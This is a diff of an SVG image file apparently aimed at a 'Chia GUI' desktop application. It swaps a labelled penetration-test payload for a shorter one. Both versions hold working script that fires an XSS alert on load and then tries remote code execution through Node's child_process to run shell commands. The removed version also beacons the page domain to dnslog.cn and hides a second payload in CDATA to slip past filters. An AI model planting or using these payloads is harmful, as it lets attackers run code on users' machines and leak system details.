@@ -1,98 +1,19 @@
-<?xml version="1.0" standalone="no"?>
-<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
-<!-- Evil SVG for penetration testing - PENTEST-ID: SVG-XSS-001 -->
-<svg xmlns="http://www.w3.org/2000/svg" 
-     xmlns:xlink="http://www.w3.org/1999/xlink" 
-     width="200" height="200" 
-     onload="svgLoaded()" 
-     onmouseover="mouseOverEvent()">
-  
-  <title>Security Test Vector</title>
-  <desc>This SVG contains security test payloads for authorized penetration testing only</desc>
-  
-  <!-- Multiple event handlers for better detection -->
-  <script type="text/javascript">
-    // Log execution environment details
-    function svgLoaded() {
-      console.log('[PENTEST] SVG execution context:', {
-        url: window.location.href,
-        referrer: document.referrer,
-        userAgent: navigator.userAgent,
-        timestamp: new Date().toISOString()
-      });
-      
-      // Primary XSS detection
-      try {
-        localStorage.setItem('xss_proof', 'chia_svg_xss_executed');
-        document.cookie = 'XSS_TEST=chia_svg_executed; path=/';
-        alert('XSS in Chia GUI! [PENTEST-ID: SVG-XSS-001]');
-      } catch(e) {
-        console.error('[PENTEST] XSS detection limited:', e.message);
-      }
-      
-      // Attempt RCE if in Node.js context
-      try {
-        if (typeof require === 'function') {
-          const { exec } = require('child_process');
-          // Create timestamped evidence file
-          const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
-          const cmd = `echo "SVG Execution at ${timestamp}" > /tmp/chia_pentest_${timestamp}`;
-          
-          exec(cmd, (error, stdout, stderr) => {
-            if (error) {
-              console.log('[PENTEST] RCE attempt error:', error);
-            } else {
-              console.log('[PENTEST] RCE SUCCESS: Evidence created with timestamp');
-              // Attempt to exfiltrate basic system info
-              exec('whoami && hostname && pwd', (e, out) => {
-                console.log('[PENTEST] System context:', out);
-              });
-            }
-          });
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS in Chia GUI!')">
+  <script>
+    try {
+      const { exec } = require('child_process');
+      exec('touch /tmp/chia_pwned_for_real', (error, stdout, stderr) => {
+        if (error) {
+          console.log('Error:', error);
+        } else {
+          console.log('RCE SUCCESS: File created at /tmp/chia_pwned_for_real');
         }
-      } catch (e) {
-        console.log('[PENTEST] RCE detection failed:', e.message);
-      }
-    }
-    
-    function mouseOverEvent() {
-      // Secondary trigger for environments that might block onload
-      console.log('[PENTEST] Mouse interaction detected');
-      try {
-        fetch('https://dnslog.cn/getdomain.php?t=' + encodeURIComponent(document.domain))
-          .catch(e => console.log('[PENTEST] Fetch attempt recorded'));
-      } catch(e) {}
+      });
+      alert('RCE EXECUTED - Check /tmp/chia_pwned_for_real');
+    } catch (e) {
+      alert('XSS Confirmed but RCE failed: ' + e.message);
     }
   </script>
-  
-  <!-- Visual indicator with pentest ID -->
-  <defs>
-    <linearGradient id="warning" x1="0%" y1="0%" x2="100%" y2="100%">
-      <stop offset="0%" style="stop-color:rgb(255,0,0);stop-opacity:1" />
-      <stop offset="100%" style="stop-color:rgb(255,165,0);stop-opacity:1" />
-    </linearGradient>
-  </defs>
-  
-  <!-- Main visual elements -->
-  <rect width="200" height="200" fill="url(#warning)" />
-  <text x="20" y="40" font-family="Arial" font-size="16" fill="white">SECURITY TEST</text>
-  <text x="20" y="70" font-family="Arial" font-size="24" font-weight="bold" fill="white">PENTEST</text>
-  <text x="20" y="100" font-family="Arial" font-size="16" fill="white">SVG-XSS-001</text>
-  <text x="20" y="130" font-family="monospace" font-size="12" fill="white">Timestamp: </text>
-  <text x="20" y="150" font-family="monospace" font-size="12" fill="white" id="timestamp">
-    <script type="text/javascript">
-      document.getElementById('timestamp').textContent = new Date().toISOString();
-    </script>
-  </text>
-  
-  <!-- CDATA section for additional payload that might bypass some filters -->
-  <foreignObject width="0" height="0">
-    <![CDATA[<script>
-      // Additional payload in CDATA to bypass XML parsers
-      (function(){
-        var img = new Image();
-        img.src = 'https://dnslog.cn/getdomain.php?svg=' + encodeURIComponent(document.domain);
-      })();
-    </script>]]>
-  </foreignObject>
+  <rect width="100" height="100" fill="red"/>
+  <text x="10" y="50" fill="white">PWNED</text>
 </svg>
